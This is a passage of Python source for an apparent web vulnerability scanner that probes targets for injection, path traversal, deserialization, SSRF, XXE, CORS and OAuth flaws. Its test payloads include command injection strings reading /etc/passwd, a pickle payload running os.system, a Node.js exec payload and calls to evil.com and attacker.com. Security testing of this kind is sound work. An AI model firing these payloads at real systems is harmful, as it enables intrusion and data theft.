                        'recommendation': 'Implement proper file type validation'
                    })

            # Test path traversal
            traversal_paths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ]

            for path in traversal_paths:
                response = self.session.get(f"{target_url}/download?file={path}")
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Path Traversal',
                        'severity': 'Critical',
                        'description': 'Directory traversal vulnerability detected',
                        'recommendation': 'Implement proper path validation'
                    })

        except Exception as e:
            print(f"Error in file vulnerability testing: {str(e)}")
        return vulnerabilities

    def _test_information_disclosure(self, target_url):
        vulnerabilities = []
        try:
            sensitive_files = [
                '/.git/config',
                '/.env',
                '/wp-config.php',
                '/config.php',
                '/debug.log',
                '/.htaccess',
                '/server-status',
                '/.svn/entries',
                '/.DS_Store'
            ]

            for file in sensitive_files:
                response = self.session.get(urljoin(target_url, file))
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'severity': 'High',
                        'description': f'Sensitive file exposed: {file}',
                        'recommendation': 'Remove or protect sensitive files'
                    })

            # Check for debug information
            error_triggers = [
                "')",
                "\")",
                "1/0",
                "[]."
            ]

            for trigger in error_triggers:
                response = self.session.get(f"{target_url}?debug={trigger}")
                if any(indicator in response.text.lower() for indicator in 
                       ['stack trace', 'debug', 'exception', 'error']):
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'description': 'Debug information exposed',
                        'recommendation': 'Disable debug mode in production'
                    })

        except Exception as e:
            print(f"Error in information disclosure testing: {str(e)}")
        return vulnerabilities

    def _test_client_side_exploits(self, target_url):
        vulnerabilities = []
        try:
            # Test CORS misconfiguration
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(target_url, headers=headers)
            cors_header = response.headers.get('Access-Control-Allow-Origin')

            if cors_header == '*' or cors_header == 'https://evil.com':
                vulnerabilities.append({
                    'type': 'CORS Misconfiguration',
                    'severity': 'High',
                    'description': 'Overly permissive CORS policy',
                    'recommendation': 'Implement strict CORS policy'
                })

            # Test for DOM Clobbering
            dom_test_payloads = [
                '<form id="config"><input name="admin" value="true"></form>',
                '<a id="config" href="javascript:alert(1)">click</a>'
            ]

            for payload in dom_test_payloads:
                response = self.session.post(urljoin(target_url, '/content'),
                                          data={'content': payload})
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'DOM Clobbering',
                        'severity': 'Medium',
                        'description': 'Potential DOM Clobbering vulnerability',
                        'recommendation': 'Implement proper DOM sanitization'
                    })

            # Test for Prototype Pollution
            pollution_payloads = [
                {'__proto__': {'admin': True}},
                {'constructor': {'prototype': {'admin': True}}}
            ]

            for payload in pollution_payloads:
                response = self.session.post(urljoin(target_url, '/api/data'),
                                          json=payload)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Prototype Pollution',
                        'severity': 'High',
                        'description': 'Potential Prototype Pollution vulnerability',
                        'recommendation': 'Implement proper JSON parsing security'
                    })

        except Exception as e:
            print(f"Error in client-side exploit testing: {str(e)}")
        return vulnerabilities

    def _test_cache_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Test for web cache poisoning
            cache_headers = {
                'X-Forwarded-Host': 'evil.com',
                'X-Forwarded-Scheme': 'https',
                'X-Host': 'evil.com'
            }

            for header, value in cache_headers.items():
                response = self.session.get(target_url, headers={header: value})
                if value in response.text:
                    vulnerabilities.append({
                        'type': 'Cache Poisoning',
                        'severity': 'High',
                        'description': f'Potential cache poisoning via {header}',
                        'recommendation': 'Implement proper cache key generation'
                    })

            # Test for CDN misconfiguration
            cdn_headers = {
                'CF-Connecting-IP': '127.0.0.1',
                'X-Original-URL': '/admin',
                'X-Rewrite-URL': '/admin'
            }

            for header, value in cdn_headers.items():
                response = self.session.get(target_url, headers={header: value})
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'CDN Misconfiguration',
                        'severity': 'High',
                        'description': f'Potential CDN bypass via {header}',
                        'recommendation': 'Configure CDN security headers properly'
                    })

        except Exception as e:
            print(f"Error in cache vulnerability testing: {str(e)}")
        return vulnerabilities

    def _check_advanced_injection(self, url):
        vulnerabilities = []
        injection_tests = {
            'sql': {
                'payloads': [
                    "' OR '1'='1", 
                    "1; DROP TABLE users--",
                    "' UNION SELECT NULL,NULL,NULL--"
                ],
                'patterns': [
                    'sql', 'mysql', 'oracle', 'syntax error'
                ]
            },
            'nosql': {
                'payloads': [
                    '{"$ne": null}',
                    '{"$where": "return true"}'
                ],
                'patterns': [
                    'mongodb', 'mongoose', 'nosql'
                ]
            },
            'command': {
                'payloads': [
                    '| ls',
                    '; cat /etc/passwd',
                    '`whoami`',
                    '$(echo vulnerable)'
                ],
                'patterns': [
                    '/bin/', '/etc/', 'root:', 'system32'
                ]
            }
        }

        for injection_type, test_data in injection_tests.items():
            for payload in test_data['payloads']:
                try:
                    response = self.session.get(f"{url}?param={payload}")
                    if any(pattern.lower() in response.text.lower() 
                          for pattern in test_data['patterns']):
                        vulnerabilities.append({
                            'type': f'{injection_type.upper()} Injection',
                            'severity': 'High',
                            'description': f'Potential {injection_type.upper()} injection at {url}',
                            'payload': payload,
                            'recommendation': f'Implement proper input validation and sanitization for {injection_type}'
                        })
                except Exception as e:
                    continue

        return vulnerabilities

    def _check_advanced_misconfigurations(self, target_url):
        vulnerabilities = []
        sensitive_paths = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/phpinfo.php',
            '/.htaccess',
            '/server-status',
            '/admin/',
            '/backup/',
            '/.svn/',
            '/.DS_Store',
            '/web.config',
            '/crossdomain.xml',
            '/robots.txt',
            '/sitemap.xml'
        ]

        for path in sensitive_paths:
            try:
                response = self.session.get(urljoin(target_url, path))
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Misconfiguration',
                        'severity': 'High',
                        'description': f'Sensitive file/directory exposed: {path}',
                        'recommendation': f'Remove or properly secure {path}'
                    })
            except Exception as e:
                continue

        return vulnerabilities

    def _test_api_security(self, target_url):
        vulnerabilities = []
        api_tests = [
            self._test_api_authentication,
            self._test_api_rate_limiting,
            self._test_api_input_validation,
            self._test_api_output_encoding
        ]

        for test in api_tests:
            try:
                vulns = test(target_url)
                vulnerabilities.extend(vulns)
            except Exception as e:
                print(f"Error in API security testing: {str(e)}")

        return vulnerabilities

    def _deep_crawl(self, target_url, max_pages=50):
        visited = set()
        to_visit = {target_url}
        base_domain = urlparse(target_url).netloc

        while to_visit and len(visited) < max_pages:
            url = to_visit.pop()
            if url in visited:
                continue

            try:
                response = self.session.get(url)
                visited.add(url)

                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all(['a', 'form', 'script', 'iframe']):
                    href = link.get('href') or link.get('src') or link.get('action')
                    if href:
                        full_url = urljoin(url, href)
                        if urlparse(full_url).netloc == base_domain:
                            to_visit.add(full_url)
            except:
                continue

        return list(visited)

    def _check_critical_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Check for deserialization vulnerabilities
            deser_vulns = self._check_deserialization(target_url)
            vulnerabilities.extend(deser_vulns)

            # Check for potential zero-day exploits
            zeroday_vulns = self._check_zero_day_patterns(target_url)
            vulnerabilities.extend(zeroday_vulns)

            # Check for privilege escalation via kernel exploits
            priv_esc_vulns = self._check_privilege_escalation_kernel(target_url)
            vulnerabilities.extend(priv_esc_vulns)

            # Check for credential dumping vulnerabilities
            cred_dump_vulns = self._check_credential_dumping(target_url)
            vulnerabilities.extend(cred_dump_vulns)

            # Check for heap overflow vulnerabilities
            heap_vulns = self._check_heap_overflow(target_url)
            vulnerabilities.extend(heap_vulns)

            # Check for cloud metadata service exploitation
            cloud_vulns = self._check_cloud_metadata_exposure(target_url)
            vulnerabilities.extend(cloud_vulns)

            # Check for supply chain vulnerabilities
            supply_chain_vulns = self._check_supply_chain(target_url)
            vulnerabilities.extend(supply_chain_vulns)

            # Check for container security issues
            container_vulns = self._check_container_security(target_url)
            vulnerabilities.extend(container_vulns)

        except Exception as e:
            print(f"Error in critical vulnerability checks: {str(e)}")

        return vulnerabilities

    def _check_deserialization(self, target_url):
        vulnerabilities = []
        try:
            # Test for Java deserialization
            java_payload = "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdA"
            response = self.session.post(target_url, data=java_payload)
            if 'java.io.IOException' in response.text:
                vulnerabilities.append({
                    'type': 'Deserialization',
                    'severity': 'Critical',
                    'description': 'Potential Java deserialization vulnerability detected',
                    'recommendation': 'Implement secure deserialization practices'
                })

            # Test for PHP deserialization
            php_payload = 'O:8:"stdClass":0:{}'
            response = self.session.post(target_url, data=php_payload)
            if 'unserialize' in response.text:
                vulnerabilities.append({
                    'type': 'Deserialization',
                    'severity': 'Critical',
                    'description': 'Potential PHP deserialization vulnerability detected',
                    'recommendation': 'Use safe deserialization methods'
                })

            # Test for Python pickle deserialization
            python_payload = b'cos\nsystem\n(S\'id\'\ntR.'
            response = self.session.post(target_url, data=python_payload)
            if 'pickle' in response.text:
                vulnerabilities.append({
                    'type': 'Deserialization',
                    'severity': 'Critical',
                    'description': 'Potential Python pickle deserialization vulnerability detected',
                    'recommendation': 'Use secure alternatives like JSON'
                })

            # Test for Node.js deserialization
            node_payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}"}'  
            response = self.session.post(target_url, data=node_payload)
            if 'node' in response.text.lower():
                vulnerabilities.append({
                    'type': 'Deserialization',
                    'severity': 'Critical',
                    'description': 'Potential Node.js deserialization vulnerability detected',
                    'recommendation': 'Use secure JSON parsing methods'
                })

        except Exception as e:
            print(f"Error checking deserialization: {str(e)}")

        return vulnerabilities
    def _check_zero_day_patterns(self, target_url):
        vulnerabilities = []
        try:
            # Check for unusual error patterns
            response = self.session.get(target_url)
            error_patterns = [
                'Internal Server Error',
                'Debug Information', 
                'Stack Trace',
                'Memory Dump',
                'Core Dump'
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    vulnerabilities.append({
                        'type': 'Zero-Day',
                        'severity': 'Critical',
                        'description': f'Potential zero-day vulnerability: {pattern} exposure',
                        'recommendation': 'Disable debug information in production'
                    })

            # Check for unusual response headers
            unusual_headers = [
                'X-Debug',
                'X-Runtime',
                'X-Application-Context',
                'X-Environment'
            ]
            
            for header in unusual_headers:
                if header in response.headers:
                    vulnerabilities.append({
                        'type': 'Zero-Day',
                        'severity': 'Critical',
                        'description': f'Potential zero-day vulnerability: {header} header exposed',
                        'recommendation': 'Remove debug headers in production'
                    })

        except Exception as e:
            print(f"Error checking zero-day patterns: {str(e)}")

        return vulnerabilities

    def _check_privilege_escalation_kernel(self, target_url):
        vulnerabilities = []
        try:
            # Check for exposed system information
            system_paths = [
                '/proc/version',
                '/etc/passwd',
                '/etc/shadow',
                '/etc/group',
                '/etc/hosts',
                '/proc/self/environ'
            ]

            for path in system_paths:
                response = self.session.get(urljoin(target_url, path))
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Privilege Escalation',
                        'severity': 'Critical',
                        'description': f'System file exposed: {path}',
                        'recommendation': 'Restrict access to system files'
                    })

        except Exception as e:
            print(f"Error checking privilege escalation: {str(e)}")

        return vulnerabilities

    def _check_cloud_metadata_exposure(self, target_url):
        vulnerabilities = []
        try:
            # Check AWS metadata service
            aws_metadata_endpoints = [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data/',
                'http://169.254.169.254/latest/dynamic/instance-identity/'
            ]

            # Check GCP metadata service
            gcp_metadata_endpoints = [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://metadata.google.internal/computeMetadata/v1/project/'
            ]

            # Check Azure metadata service
            azure_metadata_endpoints = [
                'http://169.254.169.254/metadata/instance',
                'http://169.254.169.254/metadata/identity'
            ]

            headers = {
                'Metadata-Flavor': 'Google',  # For GCP
                'X-Metadata-Token': 'allowed',  # For Azure
                'X-aws-ec2-metadata-token': 'required'  # For AWS IMDSv2
            }

            for endpoint in aws_metadata_endpoints + gcp_metadata_endpoints + azure_metadata_endpoints:
                try:
                    response = self.session.get(endpoint, headers=headers, timeout=2)
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Cloud Metadata Exposure',
                            'severity': 'Critical',
                            'description': f'Cloud metadata service exposed: {endpoint}',
                            'recommendation': 'Block access to cloud metadata service from application'
                        })
                except:
                    continue

        except Exception as e:
            print(f"Error checking cloud metadata exposure: {str(e)}")

        return vulnerabilities

    def _check_high_severity_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Check for SSRF vulnerabilities
            ssrf_vulns = self._check_ssrf(target_url)
            vulnerabilities.extend(ssrf_vulns)

            # Check for OAuth token manipulation
            oauth_vulns = self._check_oauth_vulnerabilities(target_url)
            vulnerabilities.extend(oauth_vulns)

            # Check for GraphQL injection
            graphql_vulns = self._check_graphql_injection(target_url)
            vulnerabilities.extend(graphql_vulns)

            # Check for XXE injection
            xxe_vulns = self._check_xxe_injection(target_url)
            vulnerabilities.extend(xxe_vulns)

        except Exception as e:
            print(f"Error in high severity checks: {str(e)}")

        return vulnerabilities

    def _check_ssrf(self, target_url):
        vulnerabilities = []
        try:
            # Test internal network access
            internal_urls = [
                'http://localhost/',
                'http://127.0.0.1/',
                'http://169.254.169.254/',  # AWS metadata
                'http://192.168.0.1/',
                'http://10.0.0.0/',
                'file:///etc/passwd'
            ]

            for url in internal_urls:
                response = self.session.get(f"{target_url}?url={url}")
                if any(pattern in response.text.lower() for pattern in ['private', 'internal', 'localhost']):
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'severity': 'High',
                        'description': f'Potential SSRF vulnerability detected with URL: {url}',
                        'recommendation': 'Implement URL validation and whitelist'
                    })

        except Exception as e:
            print(f"Error checking SSRF: {str(e)}")

        return vulnerabilities

    def _check_oauth_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Check for common OAuth misconfigurations
            oauth_endpoints = [
                '/oauth/authorize',
                '/oauth/token',
                '/oauth/callback',
                '/auth/callback'
            ]

            for endpoint in oauth_endpoints:
                response = self.session.get(urljoin(target_url, endpoint))
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'OAuth',
                        'severity': 'High',
                        'description': f'Exposed OAuth endpoint: {endpoint}',
                        'recommendation': 'Secure OAuth implementation and validate redirects'
                    })

            # Check for redirect_uri validation
            malicious_redirect = 'https://attacker.com/callback'
            response = self.session.get(f"{target_url}/oauth/authorize?redirect_uri={malicious_redirect}")
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'OAuth',
                    'severity': 'High',
                    'description': 'OAuth redirect_uri validation bypass possible',
                    'recommendation': 'Implement strict redirect_uri validation'
                })

        except Exception as e:
            print(f"Error checking OAuth vulnerabilities: {str(e)}")

        return vulnerabilities

    def _check_graphql_injection(self, target_url):
        vulnerabilities = []
        try:
            graphql_endpoints = [
                '/graphql',
                '/api/graphql',
                '/graphiql',
                '/playground'
            ]

            introspection_query = '''
            query IntrospectionQuery {
              __schema {
                types {
                  name
                  fields {
                    name
                    type {
                      name
                    }
                  }
                }
              }
            }
            '''

            for endpoint in graphql_endpoints:
                response = self.session.post(
                    urljoin(target_url, endpoint),
                    json={'query': introspection_query}
                )

                if '__schema' in response.text:
                    vulnerabilities.append({
                        'type': 'GraphQL',
                        'severity': 'High',
                        'description': f'GraphQL introspection enabled at {endpoint}',
                        'recommendation': 'Disable GraphQL introspection in production'
                    })

        except Exception as e:
            print(f"Error checking GraphQL injection: {str(e)}")

        return vulnerabilities

    def _check_xxe_injection(self, target_url):
        vulnerabilities = []
        try:
            # Test for XXE in XML upload endpoints
            xml_endpoints = [
                '/upload',
                '/import',
                '/xml',
                '/api/xml'
            ]

            xxe_payload = '''
            <?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>
            '''

            headers = {'Content-Type': 'application/xml'}

            for endpoint in xml_endpoints:
                response = self.session.post(
                    urljoin(target_url, endpoint),
                    data=xxe_payload,
                    headers=headers
                )

                if any(pattern in response.text for pattern in ['root:', '/bin/bash']):
                    vulnerabilities.append({
                        'type': 'XXE',
                        'severity': 'High',
                        'description': f'XXE vulnerability detected at {endpoint}',
                        'recommendation': 'Disable XML external entity processing'
                    })

        except Exception as e:
            print(f"Error checking XXE injection: {str(e)}")

        return vulnerabilities